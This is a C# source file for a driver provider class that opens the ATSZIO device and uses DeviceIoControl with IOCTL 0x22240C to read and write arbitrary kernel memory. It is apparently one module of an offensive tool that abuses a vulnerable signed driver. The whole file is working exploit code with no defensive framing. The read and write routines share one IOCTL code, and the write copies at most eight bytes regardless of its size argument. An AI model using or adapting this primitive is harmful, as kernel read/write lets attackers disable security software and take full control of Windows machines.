using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class ATSZIODriver : IProvider
{
	private const string DeviceName = "\\\\.\\ATSZIO";
	private const uint IOCTL = 0x22240C;
	private SafeFileHandle _handle;

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool DeviceIoControl(
	SafeFileHandle hDevice,
	uint dwIoControlCode,
	[In] byte[] lpInBuffer,
	int nInBufferSize,
	[Out] byte[] lpOutBuffer,
	int nOutBufferSize,
	ref int lpBytesReturned,
	IntPtr lpOverlapped);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool DeviceIoControl(
		SafeFileHandle hDevice,
		uint dwIoControlCode,
		[In] byte[] lpInBuffer,
		int nInBufferSize,
		IntPtr lpOutBuffer,
		int nOutBufferSize,
		ref int lpBytesReturned,
		IntPtr lpOverlapped);

	public bool Open()
	{
		_handle = NativeMethods.CreateFile(DeviceName, FileAccess.ReadWrite,
			FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);

		if (_handle == null || _handle.IsInvalid || _handle.IsClosed)
		{
			Console.WriteLine($"[-] Failed to open device: {DeviceName}");
			return false;
		}

		return true;
	}


	public void Close()
	{
		_handle?.Dispose();
	}

	public bool ReadKernelMemory(ulong address, byte[] buffer, int size)
	{
		if (_handle == null || _handle.IsInvalid || _handle.IsClosed)
		{
			Console.WriteLine("[-] Device handle is invalid.");
			return false;
		}
		byte[] input = BitConverter.GetBytes(address);
		int bytesReturned = 0;

		return DeviceIoControl(_handle, IOCTL,
			input, input.Length,
			buffer, size,
			ref bytesReturned, IntPtr.Zero);
	}


	public bool WriteKernelMemory(ulong address, byte[] data, int size)
	{
		if (_handle == null || _handle.IsInvalid || _handle.IsClosed)
		{
			Console.WriteLine("[-] Device handle is invalid.");
			return false;
		}
		byte[] input = new byte[16];
		Buffer.BlockCopy(BitConverter.GetBytes(address), 0, input, 0, 8);
		Buffer.BlockCopy(data, 0, input, 8, Math.Min(8, data.Length));

		int bytesReturned = 0;

		return DeviceIoControl(_handle, IOCTL,
			input, input.Length,
			IntPtr.Zero, 0,
			ref bytesReturned, IntPtr.Zero);
	}

}
